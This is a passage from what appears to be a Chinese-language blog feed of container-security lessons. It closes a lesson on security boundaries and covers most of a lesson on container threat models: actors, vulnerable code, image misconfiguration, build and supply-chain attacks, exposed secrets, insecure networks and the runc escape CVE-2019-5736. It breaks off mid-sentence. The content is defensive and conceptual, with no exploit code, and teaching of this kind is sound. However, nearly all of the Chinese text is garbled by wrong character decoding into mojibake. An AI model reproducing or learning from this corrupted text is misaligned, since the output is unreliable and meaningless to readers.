è®ºæ˜¯è¿›å…¥å…¶ä»–çš„å®¹å™¨è¿˜æ˜¯é€ƒé€¸åˆ°å®¿ä¸»æœºä¸­ï¼‰ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬åˆ—ä¸¾å‡ºä¸¤ç§æ–¹æ³•ä»¥ä¾›å‚è€ƒï¼š<ol><li>é€šè¿‡å®¹å™¨è‡ªå¸¦çš„é€ƒé€¸æ¼æ´ä»å®¹å™¨ä¸­é€ƒé€¸ã€‚</li><li>é€šè¿‡å®¹å™¨çš„ä¸å®‰å…¨é…ç½®è¿›è¡Œé€ƒé€¸ã€‚</li></ol></li><li>è‹¥æ”»å‡»è€…æˆåŠŸåœ°ä»å®¹å™¨å†…é€ƒé€¸åˆ°äº†å®¿ä¸»æœºä¸Šï¼Œé‚£ä¹ˆä»–ä¸‹ä¸€ä¸ªç›®æ ‡åº”è¯¥æ˜¯è¦è·å–å®¿ä¸»æœºçš„<code>root</code>æƒé™ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬æå‡ºä¸€ç§å¯¹äºå¼€å‘è€…è€Œè¨€éå¸¸å®¹æ˜“ä¸­æ‹›ï¼Œè€Œå¯¹äºæ”»å‡»è€…è€Œè¨€éå¸¸ç®€å•çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯ï¼š<ol><li>åº”ç”¨ç¨‹åºåœ¨å®¹å™¨å†…ä»¥ <code>root</code>çš„èº«ä»½è¿è¡Œã€‚å…·ä½“åŸå› æˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> ä¸­æ­æ™“ã€‚</li></ol></li><li>æ”»å‡»è€…è·å–åˆ°å®¿ä¸»æœºçš„ <code>root</code> æƒé™è¿‡åï¼Œå°±å¯ä»¥è®¿é—®å®¿ä¸»æœºä¸Šçš„ä»»ä½•å†…å®¹äº†ï¼Œç”šè‡³å¯ä»¥è¯´æ˜¯å®¿ä¸»æœºä¸Šè¿è¡Œçš„å®¹å™¨éƒ½å¯ä»¥è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰å†…å®¹äº†ã€‚</li></ol><p>æ‰€ä»¥ï¼Œä¸ºäº†é¿å…æ­¤ç±»äº‹ä»¶çš„å‘ç”Ÿï¼Œåœ¨éƒ¨ç½²ç¯å¢ƒä¸­å¢åŠ æˆ–åŠ å¼ºå®‰å…¨è¾¹ç•Œæ˜¯ä¸ªå¾ˆä¸é”™çš„ä¸»æ„ã€‚</p><h2 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬ç®€è¿°äº†å®‰å…¨è¾¹ç•Œçš„æ¦‚å¿µï¼Œå¹¶ä¸”æå‡ºï¼š<strong>åœ¨äº‘åŸç”Ÿçš„ä¸–ç•Œé‡Œï¼Œå®¹å™¨å°±æ˜¯å®‰å…¨è¾¹ç•Œ</strong>ã€‚å®¹å™¨æ‰€é¢ä¸´çš„å¤§å¤šæ•°é£é™©éƒ½èµ·æºäº<strong>å®‰å…¨è¾¹ç•Œè¢«çªç ´</strong>ï¼Œå› æ­¤è‹¥è¦æå‡ç³»ç»Ÿç¯å¢ƒçš„å®‰å…¨æ€§ï¼Œå°å°åœ°å¢åŠ æˆ–åŠ å¼ºå®‰å…¨è¾¹ç•Œå°±å¯ä»¥è¾¾åˆ°æ˜¾è‘—çš„æ•ˆæœã€‚</p><p>ä¸ºäº†è®©å¤§å®¶æ·±å…¥ç†è§£çªç ´å®‰å…¨è¾¹ç•Œçš„å¨èƒï¼Œæˆ‘ä»¬ç»“åˆäº†å®¹å™¨çš„å¨èƒæ¨¡å‹çš„å†…å®¹ï¼Œå°†æ”»å‡»å‘é‡ä¸²è”èµ·æ¥ï¼Œå‘å¤§å®¶è¿›è¡Œå±•ç¤ºã€‚</p><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¬¡å¼ºè°ƒä½¿ç”¨å¨èƒæ¨¡å‹çš„é‡è¦æ€§ï¼Œå› ä¸ºå¨èƒæ¨¡å‹è€ƒè™‘äº†æ¥è‡ªåº”ç”¨ç¨‹åºè¿è¡Œç¯å¢ƒå†…éƒ¨çš„æ”»å‡»å¯èƒ½æ€§ã€‚åœ¨äº‘çš„éƒ¨ç½²ç¯å¢ƒä¸­ï¼Œæ‚¨å¯èƒ½ä¼šä¸å…¶ä»–çš„ç”¨æˆ·åŠå…¶åº”ç”¨ç¨‹åºå…±äº«ä¸€äº›èµ„æºã€‚è¿™ç§å…±äº«åŠå…¶èµ„æºçš„ç‰¹æ€§è¢«ç§°ä¸º<strong>å¤šç§Ÿæˆ·æ€§</strong>ï¼Œå®ƒå¯¹äºå¨èƒæ¨¡å‹åŒæ ·æœ‰ç€é‡è¦çš„å½±å“ã€‚æˆ‘ä»¬ä¸‹ä¸€è®²æ­æ™“ï½</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.2 å®¹å™¨å¨èƒæ¨¡å‹</title>
    <link href="/2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/"/>
    <url>/2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å‰é¢æˆ‘ä»¬ä»‹ç»äº†<a href="../../../../2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/index.html">ã€Š1.1 é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½ã€‹</a>çš„åŸºæœ¬æ¦‚å¿µï¼Œäº†è§£äº†ä»€ä¹ˆæ˜¯é£é™©ç®¡ç†æ¡†æ¶å’Œå¨èƒæ¨¡å‹ã€‚é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•å¯¹å®¹å™¨è¿›è¡Œå¨èƒå»ºæ¨¡å‘¢ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ€è€ƒï¼š<strong>å‚ä¸è€…æœ‰å“ªäº›ï¼Ÿ</strong></p><h2 id="0x01-å‚ä¸è€…"><a href="#0x01-å‚ä¸è€…" class="headerlink" title="0x01 å‚ä¸è€…"></a>0x01 å‚ä¸è€…</h2><p>ä¸€ä¸ªè‰¯å¥½çš„å¨èƒå»ºæ¨¡æ–¹å¼å¾€å¾€ä»è€ƒè™‘<strong>å‚ä¸è€…</strong>å¼€å§‹ï¼Œåœ¨å®¹å™¨çš„ä¸–ç•Œé‡Œï¼Œè¿™å¯èƒ½åŒ…æ‹¬ï¼š</p><ul><li><strong>å¤–éƒ¨æ”»å‡»è€…</strong>ï¼šè¯•å›¾ä»å¤–éƒ¨è®¿é—®ç³»ç»Ÿç¯å¢ƒçš„äººã€‚</li><li><strong>å†…éƒ¨æ”»å‡»è€…</strong>ï¼šå·²ç»æˆåŠŸåœ°è®¿é—®äº†éƒ¨åˆ†ç³»ç»Ÿç¯å¢ƒçš„äººã€‚</li><li><strong>æ¶æ„çš„å†…éƒ¨å‚ä¸è€…</strong>ï¼šå¯¹ç³»ç»Ÿç¯å¢ƒæœ‰ä¸€å®šæƒé™çš„æ¶æ„çš„è®¿é—®è€…ï¼Œä¾‹å¦‚æ¶æ„çš„å¼€å‘äººå‘˜å’Œç®¡ç†å‘˜ã€‚</li><li><strong>æ— æ„ä¸­çš„å†…éƒ¨å‚ä¸è€…</strong>ï¼šå¯¹ç³»ç»Ÿç¯å¢ƒæœ‰ä¸€å®šæƒé™çš„å¯èƒ½ä¼šæ„å¤–é€ æˆé—®é¢˜çš„å‚ä¸è€…ã€‚</li><li><strong>åº”ç”¨ç¨‹åºè¿›ç¨‹</strong>ï¼šè¿›ç¨‹è™½ç„¶ä¸æ˜¯æœ‰æ„æŸå®³æ‚¨çš„ç³»ç»Ÿç¯å¢ƒçš„æœ‰æ„è¯†çš„ä¸ªä½“ï¼Œä½†å®ƒå¯ä»¥é€šè¿‡ç¼–ç¨‹çš„æ–¹å¼å¯¹ç³»ç»Ÿç¯å¢ƒè¿›è¡Œè®¿é—®ã€‚</li></ul><p>è¿™äº›å‚ä¸è€…éƒ½æœ‰ä¸€å®šçš„æƒé™åˆé›†ï¼Œæˆ‘ä»¬å¯ä»¥ç«™åœ¨ä»–ä»¬çš„è§’åº¦å»æ€è€ƒä¸‹é¢çš„é—®é¢˜ï¼š</p><ul><li><strong>ä»–ä»¬é€šè¿‡å‡­æ®å¯ä»¥è·å¾—å“ªäº›è®¿é—®æƒé™ã€‚</strong> ä¾‹å¦‚ï¼Œä»–ä»¬æ˜¯å¦å¯ä»¥è®¿é—®å®¹å™¨æ‰€åœ¨çš„å®¿ä¸»æœºä¸Šçš„ç”¨æˆ·è´¦å·ï¼Ÿ</li><li><strong>å®¹å™¨ä¸­åŒ…å«å“ªäº›æƒé™</strong>ã€‚ä¾‹å¦‚ï¼Œåœ¨ Kubernetes ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ <a href="https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/" title="RBAC">RBAC</a> ï¼ˆrole-based access controlï¼ŒåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰é‰´æƒæ¥ä¸ºç”¨æˆ·ç®¡ç†é›†ç¾¤èµ„æºçš„è®¿é—®æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<a href="https://juejin.cn/post/7213298252534972474" title="åŒ¿åç”¨æˆ·">åŒ¿åç”¨æˆ·</a>ã€‚</li><li><strong>éƒ½æœ‰å“ªäº›ç½‘ç»œè®¿é—®æƒé™ã€‚</strong> ä¾‹å¦‚ï¼Œéƒ¨åˆ†ç³»ç»Ÿæ˜¯å¦åŒ…å«åœ¨ VPCï¼ˆVirtual Private Cloudï¼Œè™šæ‹Ÿç§æœ‰äº‘ï¼‰ä¸­ï¼Ÿ</li></ul><p>åœ¨<a href="https://docs.cilium.io/en/stable/security/threat-model/#threat-model" title="Cilium çš„å®˜æ–¹æ–‡æ¡£">Cilium çš„å®˜æ–¹æ–‡æ¡£</a>ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† Cilium çš„å›¢é˜Ÿä¹Ÿä½¿ç”¨è¿™ç§æ–¹å¼è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚</p><p><img src="/image/image_k7jNPYthXP.png" alt="å›¾ 1ï¼šCilium çš„å¨èƒæ¨¡å‹" title="å›¾1ï¼šCiliumçš„å¨èƒæ¨¡å‹"></p><h2 id="0x02-å®¹å™¨å¨èƒæ¨¡å‹"><a href="#0x02-å®¹å™¨å¨èƒæ¨¡å‹" class="headerlink" title="0x02 å®¹å™¨å¨èƒæ¨¡å‹"></a>0x02 å®¹å™¨å¨èƒæ¨¡å‹</h2><p>æƒ³è¦æ”»å‡»ä¸€ä¸ªå®¹å™¨åŒ–çš„ç¯å¢ƒï¼Œè¿™å¯æœ‰å¤ªå¤šçš„å¯èƒ½çš„æ–¹å¼äº†ã€‚ä½†æˆ‘ä»¬æœ‰ä¸ªæ–¹æ³•å¯ä»¥å°½é‡åœ°éƒ½æ‰¾åˆ°å®ƒä»¬ï¼Œé‚£å°±æ˜¯ï¼š<strong>ä»å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸçš„å„ä¸ªé˜¶æ®µå»è€ƒè™‘æ½œåœ¨çš„æ”»å‡»å‘é‡</strong>ã€‚</p><p><img src="/image/image_ZZOe1YFZbi.png" alt="å›¾ 2ï¼šå®¹å™¨æ”»å‡»å‘é‡" title="å›¾2ï¼šå®¹å™¨æ”»å‡»å‘é‡"></p><h3 id="2-1-åº”ç”¨ç¨‹åºä»£ç çš„æ¼æ´"><a href="#2-1-åº”ç”¨ç¨‹åºä»£ç çš„æ¼æ´" class="headerlink" title="2.1 åº”ç”¨ç¨‹åºä»£ç çš„æ¼æ´"></a>2.1 åº”ç”¨ç¨‹åºä»£ç çš„æ¼æ´</h3><p><strong>å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸå§‹äºå¼€å‘äººå‘˜ç¼–å†™çš„åº”ç”¨ç¨‹åºä»£ç </strong>ï¼Œè¿™äº›ä»£ç å’Œæ‰€ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“å¯èƒ½åŒ…å«ç€æˆåƒä¸Šä¸‡ä¸ªå·²è¢«æŠ«éœ²çš„æ¼æ´ã€‚å¦‚æœåº”ç”¨ç¨‹åºåŒ…å«è¿™äº›æ¼æ´ï¼Œé‚£ä¹ˆå¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œå®ƒå°±æ˜¯ä¸ªâ€œé¦™é¥½é¥½â€ã€‚</p><p>ä¸ºäº†é¿å…è¿è¡Œä¸­çš„å®¹å™¨åŒ…å«å·²çŸ¥çš„æ¼æ´ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯<strong>å¯¹é•œåƒè¿›è¡Œæ‰«æ</strong>ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 7 è¯¾ï¼šé•œåƒä¸­çš„è½¯ä»¶æ¼æ´ã€‹</strong> ä¸­è¿›è¡Œè¯¦ç»†çš„è®²è§£ã€‚</p><p><strong>éœ€è¦å¼ºè°ƒçš„æ˜¯ï¼Œé•œåƒæ‰«æéœ€è¦å‘¨æœŸæ€§è¿›è¡Œã€‚</strong> ç™½å¸½å­ä¼šä¸æ–­åœ°ä»å·²çŸ¥çš„ä»£ç ä¸­å‘ç°æ–°çš„æ¼æ´ï¼Œé•œåƒæ‰«ææ‰€ä¾èµ–çš„æ¼æ´åº“ä¹Ÿéœ€è¦ä¸æ–­åœ°æ›´æ–°ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®¹å™¨ä¸­çš„ç»„ä»¶ä¹Ÿä¼šéšç€æ—¶é—´çš„æ¨ç§»è€Œæ¸æ¸åœ°è¿‡æ—¶ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦æ›´æ–°å®‰å…¨è¡¥ä¸ã€‚</p><p>æ­¤å¤–ï¼Œä¸€äº›é•œåƒæ‰«æå™¨è¿˜èƒ½æ‰«æé•œåƒä¸­çš„æ¶æ„è½¯ä»¶ã€‚</p><h3 id="2-2-å®¹å™¨é•œåƒçš„ä¸è‰¯é…ç½®"><a href="#2-2-å®¹å™¨é•œåƒçš„ä¸è‰¯é…ç½®" class="headerlink" title="2.2 å®¹å™¨é•œåƒçš„ä¸è‰¯é…ç½®"></a>2.2 å®¹å™¨é•œåƒçš„ä¸è‰¯é…ç½®</h3><p>åº”ç”¨ç¨‹åºä»£ç å†™å®Œåï¼Œ<strong>å¼€å‘äººå‘˜ä¼šæ„å»ºä¸€ä¸ªé•œåƒï¼Œå°†åº”ç”¨ç¨‹åºå®¹å™¨åŒ–</strong>ã€‚</p><p>ä½†æ„å»ºé•œåƒæ—¶ï¼Œä¹Ÿä¼šå¸¦æ¥å¾ˆå¤šéšè—çš„é£é™©ç‚¹ï¼Œè¿™äº›é£é™©å¯èƒ½ä¼šå¯¼è‡´ä¹‹åè¿è¡Œçš„å®¹å™¨è¢«æ”»å‡»åˆ©ç”¨ã€‚ä¾‹å¦‚ï¼šå°†é•œåƒé…ç½®æˆä»¥ root ç”¨æˆ·çš„èº«ä»½è¿è¡Œï¼›èµ‹äºˆå®ƒè¿œè¶…è¿‡å®é™…ä½¿ç”¨æ‰€éœ€è¦çš„æ›´å¤šçš„ä¸»æœºæƒé™ã€‚</p><p>è¿™éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 6 è¯¾ï¼šå®¹å™¨é•œåƒã€‹</strong> ä¸­è¿›è¡Œè®²è§£ã€‚</p><h3 id="2-3-æ„å»ºæœºä¸Šçš„æ”»å‡»"><a href="#2-3-æ„å»ºæœºä¸Šçš„æ”»å‡»" class="headerlink" title="2.3 æ„å»ºæœºä¸Šçš„æ”»å‡»"></a>2.3 æ„å»ºæœºä¸Šçš„æ”»å‡»</h3><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿ<strong>å½±å“ç”šè‡³ä¿®æ”¹é•œåƒçš„æ„å»ºæ–¹å¼</strong>ï¼Œé‚£ä¹ˆé•œåƒå¯èƒ½ä¼šè¢«æ’å…¥æ¶æ„ä»£ç ï¼Œç„¶åæ”»å‡»è€…å†è®©è¿™äº›æ¶æ„ä»£ç åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œã€‚</p><p>å¹¶ä¸”ï¼Œåœ¨æ„å»ºç¯å¢ƒä¸­å»ºç«‹è½è„šç‚¹æ˜¯æ”»ç ´ç”Ÿäº§ç¯å¢ƒçš„åŸºçŸ³ï¼Œè¿™éƒ¨åˆ†å†…å®¹æˆ‘ä»¬ä¹Ÿå°†åœ¨ <strong>ã€Šç¬¬ 6 è¯¾ï¼šå®¹å™¨é•œåƒã€‹</strong> ä¸­è¿›è¡Œè®²è§£ã€‚</p><h3 id="2-4-ä¾›åº”é“¾æ”»å‡»"><a href="#2-4-ä¾›åº”é“¾æ”»å‡»" class="headerlink" title="2.4 ä¾›åº”é“¾æ”»å‡»"></a>2.4 ä¾›åº”é“¾æ”»å‡»</h3><p>é•œåƒæ„å»ºæˆåŠŸåï¼Œæˆ‘ä»¬ä¼šå°†å…¶<strong>æ¨é€åˆ°é•œåƒä»“åº“</strong>ä¸­ï¼Œè‹¥éœ€è¦è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦ä»é•œåƒä»“åº“ä¸­æ‹‰å–é•œåƒå³å¯ã€‚</p><p>ä½†æ‚¨åˆæ€ä¹ˆçŸ¥é“æ‚¨æ‰€æ‹‰å–çš„é•œåƒä¸ä¹‹å‰æ¨é€çš„é•œåƒå®Œå…¨ç›¸åŒå‘¢ï¼Ÿå®ƒä»¬æœ‰æ²¡æœ‰å¯èƒ½ä¼šè¢«ç¯¡æ”¹ï¼Ÿ</p><p>è¦çŸ¥é“ï¼Œè‹¥æ”»å‡»è€…å¯ä»¥<strong>åœ¨æ„å»ºç¯å¢ƒå’Œéƒ¨ç½²ç¯å¢ƒä¹‹é—´ä¿®æ”¹ç”šè‡³æ›¿æ¢é•œåƒ</strong>ï¼Œé‚£ä¹ˆä»–å®Œå…¨æœ‰å¯èƒ½åœ¨æ‚¨çš„éƒ¨ç½²ç¯å¢ƒä¸­è¿è¡Œä»»æ„ä»£ç ã€‚</p><p>è¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨ <strong>ã€Šç¬¬ 6 è¯¾ï¼šå®¹å™¨é•œåƒã€‹</strong> ä¸­å°†è®¨è®ºçš„è¯é¢˜ã€‚</p><h3 id="2-5-ä¸è‰¯é…ç½®çš„å®¹å™¨"><a href="#2-5-ä¸è‰¯é…ç½®çš„å®¹å™¨" class="headerlink" title="2.5 ä¸è‰¯é…ç½®çš„å®¹å™¨"></a>2.5 ä¸è‰¯é…ç½®çš„å®¹å™¨</h3><p>æ­£å¦‚å‰é¢æ‰€è¯´ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šèµ‹äºˆå®¹å™¨ä¸€äº›ä¸å¿…è¦çš„ã€æ²¡æœ‰ç»è¿‡è§„åˆ’çš„æƒé™ã€‚è¿™éƒ¨åˆ†å†…å®¹æˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 9 è¯¾ï¼šæ‰“ç ´å®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> è¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚</p><p>å‹æƒ…æç¤ºï¼šè‹¥æ‚¨ä»äº’è”ç½‘ä¸­ä¸‹è½½äº†ä¸€äº› YAML é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>docker-compose.yaml</code>ï¼Œåœ¨ä½¿ç”¨ä¹‹å‰è¯·ç¡®ä¿ï¼šè¿™äº›é…ç½®æ–‡ä»¶æ²¡æœ‰åŒ…å«ä¸€äº›ä¸å¿…è¦çš„æƒé™ä¸é…ç½®ã€‚</p><h3 id="2-6-æœ‰æ¼æ´çš„å®¿ä¸»æœº"><a href="#2-6-æœ‰æ¼æ´çš„å®¿ä¸»æœº" class="headerlink" title="2.6 æœ‰æ¼æ´çš„å®¿ä¸»æœº"></a>2.6 æœ‰æ¼æ´çš„å®¿ä¸»æœº</h3><p>å®¹å™¨æœ€ç»ˆæ˜¯è¦åœ¨å®¿ä¸»æœºä¸Šè¿è¡Œçš„ï¼Œæ‰€ä»¥æ‚¨è¿˜éœ€ç¡®ä¿è¿™äº›<strong>å®¿ä¸»æœºæ²¡æœ‰è¿è¡Œç€æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºå’Œç»„ä»¶</strong>ï¼Œä¾‹å¦‚ï¼šä¸€äº›åŒ…å«ç€å·²çŸ¥æ¼æ´çš„æ—§ç‰ˆæœ¬çš„ç¼–ç¨‹ç»„ä»¶ã€‚</p><p>æœ€å¥½çš„æ–¹æ³•æ˜¯ï¼š<strong>å°½é‡å‡å°‘å®‰è£…åœ¨å®¿ä¸»æœºä¸Šçš„è½¯ä»¶æ•°é‡</strong>ä»¥å‡å°‘æ”»å‡»é¢ï¼Œå¹¶ä¸”è¿˜éœ€è¦<strong>æ ¹æ®æœ€ä½³å®‰å…¨å®è·µæ¥å¯¹å®¿ä¸»æœºè¿›è¡Œæ­£ç¡®çš„é…ç½®</strong>ã€‚</p><p>è¿™éƒ¨åˆ†å†…å®¹ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> è¿›è¡Œæ·±å…¥è®²è§£ã€‚</p><h3 id="2-7-æš´éœ²çš„-secret"><a href="#2-7-æš´éœ²çš„-secret" class="headerlink" title="2.7 æš´éœ²çš„ secret"></a>2.7 æš´éœ²çš„ secret</h3><p>åº”ç”¨ç¨‹åºä»£ç é€šå¸¸éœ€è¦å‡­è¯ã€ä»¤ç‰Œï¼ˆå³ tokenï¼‰æˆ–è€…æ˜¯å¯†ç æ‰èƒ½å¤Ÿä¸ç³»ç»Ÿä¸­çš„å…¶ä»–ç»„ä»¶è¿›è¡Œé€šä¿¡ã€‚</p><p>è‹¥å¯¹åº”ç”¨ç¨‹åºè¿›è¡Œå®¹å™¨åŒ–ï¼Œæ‚¨è¿˜éœ€è¦<strong>å°†è¿™äº›æ•æ„Ÿæ•°æ®ä½œä¸º secret çš„å€¼ä¼ é€’åˆ°å®¹å™¨ä¸­</strong>ã€‚</p><p>ä¼ é€’ secret çš„æ–¹å¼æœ‰å“ªäº›å‘¢ï¼Ÿè¿™äº›æˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 12 è¯¾ï¼šä¼ é€’ secret åˆ°å®¹å™¨ä¸­ã€‹</strong> ä¸­è¿›è¡Œè®²è§£ï¼Œå¹¶åˆ†æå„ç§æ–¹æ³•çš„å®‰å…¨æ€§ã€‚</p><h3 id="2-8-ä¸å®‰å…¨çš„ç½‘ç»œ"><a href="#2-8-ä¸å®‰å…¨çš„ç½‘ç»œ" class="headerlink" title="2.8 ä¸å®‰å…¨çš„ç½‘ç»œ"></a>2.8 ä¸å®‰å…¨çš„ç½‘ç»œ</h3><p>å®¹å™¨é€šå¸¸è¦ä¸å…¶ä»–å®¹å™¨è¿›è¡Œé€šä¿¡ï¼Œæˆ–è€…éœ€è¦ä¸å¤–éƒ¨ç¯å¢ƒè¿›è¡Œé€šä¿¡ï¼Œæˆ‘ä»¬å°†åœ¨ <strong>ã€Šç¬¬ 10 è¯¾ï¼šå®¹å™¨ç½‘ç»œå®‰å…¨ã€‹</strong> ä¸­è®¨è®ºå®¹å™¨çš„å„ç§ç½‘ç»œè¿æ¥æ–¹å¼ã€‚</p><p>ç„¶ååœ¨ <strong>ã€Šç¬¬ 11 è¯¾ï¼šä½¿ç”¨ TLS åœ¨ç»„ä»¶ä¹‹é—´å»ºç«‹èµ·å®‰å…¨çš„è¿æ¥ã€‹</strong> ä¸­è®²è§£å¦‚ä½•åœ¨ç»„ä»¶ä¹‹é—´å»ºç«‹èµ·å®‰å…¨çš„è¿æ¥ã€‚</p><h3 id="2-9-å®¹å™¨é€ƒé€¸æ¼æ´"><a href="#2-9-å®¹å™¨é€ƒé€¸æ¼æ´" class="headerlink" title="2.9 å®¹å™¨é€ƒé€¸æ¼æ´"></a>2.9 å®¹å™¨é€ƒé€¸æ¼æ´</h3><p>åƒ containerd å’Œ CRI-O è¿™äº›å®¹å™¨è¿è¡Œæ—¶å·²ç»ç›¸å½“ç»å¾—èµ·å®æˆ˜çš„è€ƒéªŒå¹¶è¢«å¹¿æ³›åœ°ä½¿ç”¨äº†ã€‚ä½†å®ƒä»¬ä»ç„¶å¯èƒ½å­˜åœ¨ç€ä¸€äº›æœªè¢«å‘ç°çš„æ¼æ´ï¼Œè¿™äº›æ¼æ´å¯èƒ½ä¼šå¯¼è‡´è¿è¡Œåœ¨å®¹å™¨ä¸­çš„æ¶æ„ä»£ç é€ƒé€¸åˆ°å®¿ä¸»æœºä¸Šã€‚</p><p>2019 å¹´ï¼Œæ³¢å…°çš„å®‰å…¨ç ”ç©¶å‘˜ Adam Iwaniuk å’Œ Borys PopÅ‚awski åœ¨å‚åŠ å®Œ CTF ç«èµ›è¿‡åï¼Œä¾¿èŒç”Ÿäº†â€œ<strong>ç ”ç©¶åŸºäº Namespace çš„æ²™ç®±é€ƒé€¸çš„æ–¹æ³•</strong>â€çš„æƒ³æ³•ï¼Œæ­¤åä¾¿å‘ç°äº†è‘—åçš„<a href="https://access.redhat.com/security/vulnerabilities/runcescape" title="CVE-2019-5736">CVE-2019-5736</a>æ¼æ´ï¼Œè¯¥æ¼æ´ä¹Ÿè¢«ç§°ä¸º Runcescapeï¼Œåšå®¢<a href="https://thenewstack.io/what-you-need-to-know-about-the-runc-container-escape-vulnerability/" title="What You Need to Know About the RunC Container Escape Vulnerability">What You Need to Know About the RunC Container Escape Vulnerability</a>å¯¹è¯¥æ¼æ´è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><p><img src="/image/image_XtAjtRCv4v.png" alt="å›¾ 3ï¼šRedHat å…³äº CVE-2019-5736ï¼ˆRuncescapeï¼‰æ¼æ´çš„ä»‹ç»" title="å›¾3ï¼šRedHatå…³äºCVE-2019-5736ï¼ˆRuncescapeï¼‰æ¼æ´çš„ä»‹ç»"></p><p>ä½ å°†åœ¨ <strong>ã€Šç¬¬ 4 è¯¾ï¼šå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong> ä¸­äº†è§£åˆ°ä¸€äº›å¯ä»¥é™åˆ¶å®¹å™¨å†…çš„åº”ç”¨ç¨‹åºçš„è¡Œä¸ºçš„éš”ç¦»æœºåˆ¶ã€‚</p><p>å¯¹äºä¸€äº›æ ¸å¿ƒçš„åº”ç”¨ç¨‹åºè€Œè¨€ï¼Œå®¹å™¨é€ƒé€¸çš„åæœä¼šéå¸¸ä¸¥é‡ï¼Œæ‰€ä»¥æ‚¨éœ€è¦è€ƒè™‘æ›´åŠ å¼ºå¤§çš„å®¹å™¨éš”ç¦»æœºåˆ¶ï¼Œè¯¦æƒ…è¯·çœ‹ <strong>ã€Šç¬¬ 8 ç« ï¼šåŠ å¼ºå®¹å™¨ä¹‹é—´çš„éš”ç¦»ã€‹</strong>ã€‚</p><h2 id="0x03-æ‹“å±•é˜…è¯»"><a href="#0x03-æ‹“å±•é˜…è¯»" class="headerlink" title="0x03 æ‹“å±•é˜…è¯»"></a>0x03 æ‹“å±•é˜…è¯»</h2><p>å…¶ä»–çš„æ”»å‡»å‘é‡è¶…å‡ºäº†æœ¬æ¬¡è¯¾ç¨‹æ‰€æ¶µç›–çš„èŒƒå›´ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸å¾—ä¸ç®€è¦åœ°æç¤ºä¸€ä¸‹ï¼š</p><ol><li>åº”ç”¨ç¨‹åºçš„æºä»£ç é€šå¸¸ä¼šå­˜å‚¨åœ¨ä»£ç ä»“åº“ä¸­ï¼Œç†è®ºä¸Šæ¥è¯´è¿™äº›ä»£ç ä»“åº“ä¹Ÿæœ‰å¯èƒ½ä¼šé­åˆ°æ”»å‡»ï¼Œè¿›è€Œå¯¼è‡´åº”ç”¨ç¨‹åºä¼šè¢«ç ´åã€‚å› æ­¤ï¼Œæ‚¨éœ€è¦ç¡®ä¿ç”¨æˆ·å¯¹ä»£ç ä»“åº“è¿›è¡Œè®¿é—®æ§åˆ¶çš„æƒé™å¾—åˆ°äº†é€‚å½“åœ°ç®¡ç†ã€‚</li><li>å®¿ä¸»æœºä¹‹é—´é€šå¸¸é€šè¿‡ç½‘ç»œè¿›è¡Œè¿æ¥ï¼Œå¹¶ä¸”ä½¿ç”¨ VPC æ¥ç¡®ä¿å®‰å…¨æ€§ï¼Œç„¶åå†è¿æ¥åˆ°äº’è”ç½‘ä¸­ã€‚åœ¨ä¼ 